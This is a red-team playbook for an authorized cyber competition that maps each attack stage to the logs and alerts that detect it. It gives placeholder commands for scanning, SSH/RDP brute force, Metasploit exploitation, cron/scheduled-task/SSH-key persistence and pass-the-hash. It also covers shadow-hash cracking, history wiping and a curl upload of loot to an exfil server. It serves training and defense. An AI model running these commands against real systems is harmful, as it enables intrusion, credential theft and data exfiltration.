# Red-Team Attack Playbook (Kali) — Purple vs Purple

A red-team companion to the hardening and incident READMEs, so you understand both sides: each attack is mapped to the defense that catches it. Use this to attack authorized boxes and to predict what your own detection will see.

## Rules of engagement (read first)

- Attack only authorized systems inside the competition environment. For PvP, the attack scope is strictly `172.16.XX.50-54` where `XX` is your team number from the Discord channel.
- Out of scope, never touch: the routers (`172.16.1XX.1`) and the Kali boxes (`172.16.XX.2`). No defense or offense on those.
- No attacking before the grace period ends. Defend your own network first.
- Never modify, move, or delete any flag file, yours or anyone's. That is an instant disqualification. Read flags and submit the string; do not alter them.
- Causing a box reset costs the target team points but is not your goal; stealing flag strings and holding your own services is.
- Placeholders in angle brackets are values you fill in: `<target-IP>`, `<target-range>`, `<interface>`, `<port>`, `<username>`, `<userlist>`, `<passlist>`, **`<service>`**, `<exploit-path>`, `<LHOST>`, `<LPORT>`, `<hash>`, `<ssh-key>`, `<task-name>`, **`<pivot-IP>`**.

---

## 1) **Network reconnaissance and service enumeration**

**MITRE ATT&CK:** **T1046** Network Service Discovery (also **T1018** Remote System Discovery)

Find live hosts and open ports on the target range so you know what to attack.

**Kali commands (in order)**

```bash
# Host discovery across the authorized range
sudo nmap -sn <target-range>

# Full TCP SYN scan with service and version detection on one host
sudo nmap -sS -sV -p- -T4 <target-IP>

# Service/OS detail and default scripts on the interesting ports
sudo nmap -sC -sV -O -p <port> <target-IP>

# UDP scan of common services (slower; scored UDP services hide here)
sudo nmap -sU --top-ports 50 <target-IP>

# SMB enumeration if 445 is open (Linux targets)
enum4linux-ng -A <target-IP>
```

**What blue team detects**

- Firewall logs: a spray of connection attempts to many ports from one source IP in a short window. On Windows, Filtered Connection events in the Security log (**5152/5157**) if filtering auditing is on; on Linux, UFW **`[UFW BLOCK]`** lines in **`/var/log/ufw.log`** or dropped-packet entries in **`/var/log/syslog`**.
- Zeek **`conn.log`**: many short-lived connections from one `id.orig_h` to many `id.resp_p`, most with state `S0` (SYN, no reply) or `REJ`. **`notice.log`** may raise **`Scan::Port_Scan`** or **`Scan::Address_Scan`**.
- Suricata: ET SCAN rules fire, for example **"ET SCAN Nmap -sS"** or **"ET SCAN Potential Nmap Scan"**, and NULL/FIN/XMAS scan alerts for stealth flags.
- Tip for stealth: **`-T2`** and fewer ports lower the rate and may stay under scan thresholds; version detection (**`-sV`**) still generates full connections that Zeek logs.

---

## 2) **Credential attacks (brute force)**

**MITRE ATT&CK:** **T1110** Brute Force (**T1110.001** Password Guessing)

Guess passwords against an exposed login service to get valid credentials.

**Kali commands (in order)**

```bash
# SSH brute force (Linux targets)
hydra -L <userlist> -P <passlist> ssh://<target-IP>:<port>

# Single known user, password list only (quieter)
hydra -l <username> -P <passlist> ssh://<target-IP>

# RDP brute force (Windows targets)
hydra -L <userlist> -P <passlist> rdp://<target-IP>

# medusa alternative for SSH
medusa -h <target-IP> -U <userlist> -P <passlist> -M ssh

# SMB/login password spray (one password across many users avoids lockout)
crackmapexec smb <target-IP> -u <userlist> -p '<single-password>'
```

**What blue team detects**

- Windows: a burst of event ID **4625** (failed logon) with the same source IP, climbing SubStatus codes; **4740** if an account lockout threshold trips; **4624** followed by a logon type 10 (RDP) or 3 means a guess finally worked. The incident README's "count **4625** by source IP" one-liner surfaces this.
- Linux: repeated `Failed password for <user> from <IP>` in **`/var/log/auth.log`** (Debian/Ubuntu) or **`/var/log/secure`** (RHEL/CentOS); `auditd` USER_AUTH records with `res=failed`. A later `Accepted password` from the same IP means success.
- Zeek: many SSH connections from one host in **`ssh.log`**, often with `auth_success` false; spikes in **`conn.log`**.
- Suricata: ET rules like **"ET SCAN Rdp Brute Force"** or SSH brute-force signatures; correlation on repeated connections.
- Note: password spraying (one password, many users) stays under per-account lockout limits and is harder to spot than classic brute force, but still shows as many **4625s** / failed auth from one IP.

---

## 3) **Exploitation of a vulnerable service**

**MITRE ATT&CK:** **T1190** Exploit Public-Facing Application (**T1210** Exploitation of Remote Services)

Find a known vulnerability in an outdated service and run an exploit to get a shell.

**Kali commands (in order)**

```bash
# Identify version from the recon scan, then search for a public exploit
searchsploit <service> <version>
searchsploit -m <exploit-path>     # copy an exploit locally to review

# Metasploit path
msfconsole -q
# inside msfconsole:
search <service> <version>
use <exploit-module>
set RHOSTS <target-IP>
set RPORT <port>
set LHOST <LHOST>
set LPORT <LPORT>
check            # safely test if the target is vulnerable, when supported
exploit

# Example family: old SMB (EternalBlue-class) or an outdated SSH/OpenSSL service
# Always read the module/exploit before running it against a scored box.
```

**What blue team detects**

- Windows: event ID **4688** (new process created) showing an unexpected child process, especially `cmd.exe` or `powershell.exe` spawned by a service account or by `services.exe`/the vulnerable daemon; **7045** if the exploit installs a service; Sysmon event **1** (process create) and **3** (network connect) give the full command line and the C2 destination.
- Linux: `auditd` EXECVE records for the spawned shell and its arguments; new processes owned by the service's user in `ps`; unexpected outbound connections in `ss -tnp`. If the daemon crashes and restarts, `journalctl -u <service>` shows it.
- Zeek: the exploit's payload and callback appear in **`conn.log`** (new connection to **`<LHOST>:<LPORT>`**) and may trigger **`weird.log`**; file transfers in **`files.log`**.
- Suricata: signatures for the specific CVE (for example MS17-010 / EternalBlue rules) and generic shellcode/meterpreter rules on the reverse-shell traffic.
- The blue-team fix (patch, disable, or firewall the vulnerable service) is exactly what closes this; if your target patched, `check` will report not vulnerable.

---

## 4) **Persistence and lateral movement**

**MITRE ATT&CK:** **T1053** Scheduled Task/Job, **T1098.004** SSH Authorized Keys, **T1550.002** Pass the Hash, **T1021** Remote Services

Keep access after a reboot and move from the first box to another target.

**Kali commands (in order)**

```bash
# --- Persistence ---
# Windows scheduled task that calls back (run on the compromised host)
schtasks /create /tn <task-name> /tr "<payload-path>" /sc minute /mo 10 /ru SYSTEM

# Linux cron persistence (run on the compromised host)
(crontab -l 2>/dev/null; echo "*/10 * * * * <payload-path>") | crontab -

# Linux SSH key persistence: drop your public key
echo "<ssh-key>" >> /root/.ssh/authorized_keys

# --- Lateral movement ---
# Reuse a captured SSH key to hop to another in-scope host
ssh -i <private-key> <username>@<pivot-IP>

# Pass-the-hash to another Windows host (scope-permitting)
crackmapexec smb <pivot-IP> -u <username> -H <hash>
impacket-psexec -hashes <hash> <username>@<pivot-IP>

# Tunnel/pivot through the first host to reach segment-internal targets
# (configure a SOCKS proxy or port forward, then scan the inner range)
```

**What blue team detects**

- Windows scheduled task: event ID **4698** (scheduled task created), plus **106** in the TaskScheduler operational log; the task shows in `schtasks /query` and Task Scheduler Library (the incident README covers removing it). A SYSTEM task calling a file in a temp/user folder is a red flag.
- Linux cron: a new line in `crontab -l` or a file in **`/etc/cron.d`**; `auditd` watch on cron paths; the per-user crontab sweep in the incident README catches it.
- SSH key persistence: a new line in **`authorized_keys`** (watch the file with `auditd`); a later `Accepted publickey` in `auth.log` from an unexpected key fingerprint.
- Lateral movement: Windows event **4624** logon type 3 (network) or type **9** (new credentials / PtH signature: NTLM, seclogo) and **4672** if admin; new **4720** if an account is created on the pivot; Sysmon **3** for the SMB connection. Linux: `Accepted publickey`/`Accepted password` on **`<pivot-IP>`** from the first box's IP.
- Zeek: east-west SMB/SSH connections between two of your own hosts in **`conn.log`**, **`smb_*.log`**, and **`ssh.log`** — internal lateral traffic that normally would not happen.
- Suricata: PsExec/SMB lateral-movement signatures and pass-the-hash related rules.

---

## Post-Exploitation: Inside the Box

What to do once you have a shell on a Windows or Linux target: orient, grab flags, and expand access without voiding your score. Attack scope is strictly your authorized PvP targets.

### 1) Orient — learn where you landed

One-line: confirm who you are, what the box is, and its network before touching anything.

```bash
# Linux
whoami; id; hostname; ip addr
uname -a; cat /etc/os-release
```

```cmd
:: Windows
whoami & hostname & ipconfig /all
systeminfo
```

Key items: **`whoami`** / **`id`** (your privilege), **`uname -a`** / **`systeminfo`** (OS and patch level), **`ip addr`** / **`ipconfig`** (what else you can reach).

### 2) Find flags

One-line: locate the scored flag strings in the usual drop spots.

```bash
# Linux
find / \( -name "flag*" -o -name "*.txt" \) 2>/dev/null | grep -v /proc
ls -la /root /home /opt /var/www /tmp
```

```cmd
:: Windows
dir /s /b C:\flag*
dir /s /b C:\*.txt
dir C:\Users C:\inetpub "C:\Windows\Temp"
```

Check **`/root`**, **`/home`**, **`/opt`**, **`/var/www`**, **`/tmp`** on Linux and **`C:\Users`**, **`C:\inetpub`**, **`C:\Windows\Temp`** on Windows. **Never modify, move, or delete any flag file** — that is instant disqualification. Read it, copy the string, leave the file in place.

### 3) Read the scoring rules on the box

One-line: confirm what earns points and what triggers penalties before acting.

```bash
# Linux
find / \( -name "scoring.conf" -o -path "*/scoring/*" -o -name "README*" \) 2>/dev/null
cat /opt/scoring/scoring.conf 2>/dev/null
```

```cmd
:: Windows
dir /s /b C:\scoring* C:\*README*
type C:\scoring\scoring.conf
```

Look for **`scoring.conf`**, **`/opt/scoring`**, or a **README** and read it so you follow the competition's exact flag submission format and avoid penalty triggers.

### 4) Enumerate for more access

One-line: find a path to higher privilege or to the next box.

```bash
# Linux
sudo -l
cat /etc/sudoers 2>/dev/null
cat ~/.ssh/authorized_keys ~/.ssh/id_* 2>/dev/null
# crack hashes you can read (authorized box only)
john --wordlist=<wordlist> <shadow-file>
hashcat -m 1800 <shadow-file> <wordlist>
```

```cmd
:: Windows
whoami /priv
net localgroup administrators
```

```bash
# Windows creds from Kali
secretsdump.py <domain>/<user>:<password>@<target-IP>
```

Key items: **`sudo -l`**, **`/etc/sudoers`**, SSH keys in **`~/.ssh/authorized_keys`**, hashes from **`/etc/shadow`** (**`john`** / **`hashcat`**); on Windows **`whoami /priv`**, **`net localgroup administrators`**, **`secretsdump.py`**, plus Scheduled Tasks and Services running as **SYSTEM**.

### 5) Move laterally

One-line: pivot to the next target with stolen keys or credentials.

```bash
# Linux pivot with a stolen key
ssh -i <stolen-key> <user>@<next-target-IP>
```

```bash
# Windows pivot from Kali
psexec.py <domain>/<user>:<password>@<next-target-IP>
smbclient -U <user>%<password> //<next-target-IP>/<share>
```

Reuse found credentials and keys to reach **`<next-target-IP>`** — but only against in-scope PvP targets.

### 6) Clean up traces

One-line: reduce your footprint without destructive actions.

```bash
# Linux
unset HISTFILE
history -c
shred -u <sensitive-temp-file>
```

**Do NOT clear Windows Event Logs.** A cleared audit log (**1102**) is a loud red flag to the blue team — just stop activity instead of wiping logs. **Deleting logs or obvious destructive actions can void your score**, so keep cleanup minimal and non-destructive.

### 7) Exfiltrate the flag

One-line: get the flag string back to you for submission.

```bash
# Linux
scp <flag-file> <user>@<exfil-server>:/loot/
curl -F "f=@<flag-file>" http://<exfil-server>/upload
base64 <flag-file>   # then paste the string
```

Then submit the flag using the competition's **exact flag submission format** (for PvP, the SHA-256 of the string via the scoring submission channel). **Submitting a wrong format wastes the flag — confirm the format from step 3 first.**

---

## Where to find placeholder values

Every angle-bracket value in the four scenarios comes from an earlier step or a Kali resource. Fill them in as you go.

- `<target-IP>` / `<target-range>` / **`<pivot-IP>`**: from `nmap -sn` host discovery output (live hosts), and the scoring sheet's list of in-scope addresses (`172.16.XX.50-54`).
- `<port>`: from the `nmap -sS -sV -p-` port-scan results (the open ports column).
- `<interface>`: your Kali NIC on the VPN, from `ip -br addr` (often `tun0` or `eth0`).
- `<username>` / `<userlist>`: from SMB enumeration (`enum4linux-ng -A`, `smbclient -L //<target-IP>`, `rpcclient`), AD enumeration, or a username list you build; also `/usr/share/seclists/Usernames/` on Kali.
- `<passlist>` / `<password-list>`: Kali wordlists in `/usr/share/wordlists/` (for example `rockyou.txt`, unzip it first), and SecLists under `/usr/share/seclists/Passwords/`.
- **`<service>`** / `<version>` (service version): from `nmap -sV` or banner grabbing (`nc <target-IP> <port>`, `curl -I`).
- `<exploit-path>` / `<exploit-module>` (exploit name): from `searchsploit <service> <version>` output, or `search` inside msfconsole, matched to the detected version.
- `<payload-path>` / payload: build with `msfvenom` (for example `msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -f <format> -o <payload-path>`), or use Metasploit's payload suggestions (`show payloads` / the module default).
- `<LHOST>` / `<LPORT>`: your Kali VPN IP (from `ip -br addr`) and a listener port you choose for the callback.
- cron schedule (the `*/10 * * * *` field): attacker-chosen timing; pick how often persistence should call back.
- `<ssh-key>` / `<private-key>` (ssh key path): generate with `ssh-keygen` (default `~/.ssh/id_rsa` and `id_rsa.pub`); the public key goes in the target's **`authorized_keys`**, the private key you pass to `ssh -i`.
- `<task-name>`: attacker-chosen; use an innocuous name so it blends into the Task Scheduler Library.
- `<hash>`: from credential dumping once you have access, for example `impacket-secretsdump <domain>/<user>:<pass>@<target-IP>`, Mimikatz, or the SAM/LSASS on the host.

## Closing note

This playbook is for authorized competition environments only (the PvP lab and boxes SEV is cleared to test). Do not run any of it against systems you do not own or are not explicitly authorized to attack. Stay inside the rules of engagement above at all times.
